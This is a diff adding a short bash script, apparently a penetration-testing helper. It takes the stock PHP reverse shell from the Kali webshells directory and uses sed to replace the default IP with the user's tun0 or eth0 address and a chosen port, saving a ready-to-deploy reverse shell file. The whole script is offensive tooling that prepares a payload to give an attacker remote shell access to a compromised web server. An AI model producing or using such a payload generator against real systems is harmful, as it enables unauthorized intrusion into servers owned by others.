@@ -1,0 +1,29 @@
+#!/bin/bash
+
+# set colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+NO_COLOR='\033[0m'
+CLEAR_LINE='\r\033[K'
+
+# default reverse shell
+php_shell_reverse=/usr/share/webshells/php/php-reverse-shell.php
+
+# ip address tries tun0; if not present then eth0
+if tun0_full=$(ifconfig tun0 2>/dev/null); then
+    ip=$(/sbin/ifconfig tun0 | grep inet | cut -d" " -f10 | head -1);
+    else
+    ip=$(/sbin/ifconfig eth0 | grep inet | cut -d" " -f10 | head -1);
+fi
+
+printf "\n${YELLOW}port?${NO_COLOR}"
+read port
+
+printf "\n${YELLOW}filename?${NO_COLOR}"
+read filename
+
+current_dir=$(pwd)
+
+# magic
+/bin/sed -e "s@127.0.0.1@$ip@" -e "s@1234@$port@" $php_shell_reverse > $current_dir/$filename
